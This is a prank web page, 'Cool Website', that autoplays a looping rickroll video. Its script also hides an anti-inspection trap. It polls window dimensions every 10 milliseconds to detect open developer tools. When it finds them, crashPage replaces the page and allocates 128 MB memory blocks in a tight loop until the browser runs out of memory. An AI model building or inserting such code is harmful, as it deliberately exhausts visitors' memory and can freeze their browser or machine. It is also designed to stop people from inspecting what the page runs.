<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cool Website</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: #ffffff;
        }
        #overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            z-index: 10;
            font-size: 2rem;
            font-weight: bold;
            text-align: center;
            padding: 20px;
        }
        video {
            width: 100%; height: 100%;
            object-fit: contain;
            display: none;
        }
    </style>
</head>
<body>
    <div id="overlay">Click to enter my cool website!</div>
    <video id="rickroll" src="rickroll.mp4" loop playsinline></video>
    <script>
        const overlay = document.getElementById('overlay');
        const video = document.getElementById('rickroll');

        window.addEventListener('load', () => {
            video.muted = true;
            video.style.display = 'block';
            overlay.style.display = 'none';
            video.play().then(() => {
                document.addEventListener('click', () => { video.muted = false; }, { once: true });
            }).catch(() => {
                video.muted = false;
                overlay.style.display = 'flex';
                video.style.display = 'none';
                overlay.addEventListener('click', () => {
                    overlay.style.display = 'none';
                    video.style.display = 'block';
                    video.play();
                });
            });
        });

        function crashPage() {
            document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:40vh">❌</h1>';
            const chunks = [];
            const interval = setInterval(() => {
                try {
                    for (let i = 0; i < 50; i++) {
                        chunks.push(new Uint8Array(128 * 1024 * 1024));
                    }
                } catch (e) {
                    clearInterval(interval);
                    location.replace('about:blank');
                }
            }, 0);
        }

        let triggered = false;
        function checkDevTools() {
            if (triggered) return;
            const widthGap = window.outerWidth - window.innerWidth;
            const heightGap = window.outerHeight - window.innerHeight;
            const suspiciouslyNarrow = window.outerWidth < 800 && screen.width >= 1024;
            if (widthGap > 160 || heightGap > 160 || suspiciouslyNarrow) {
                triggered = true;
                crashPage();
            }
        }

        setInterval(checkDevTools, 10);
        window.addEventListener('resize', checkDevTools);
    </script>
</body>
</html>
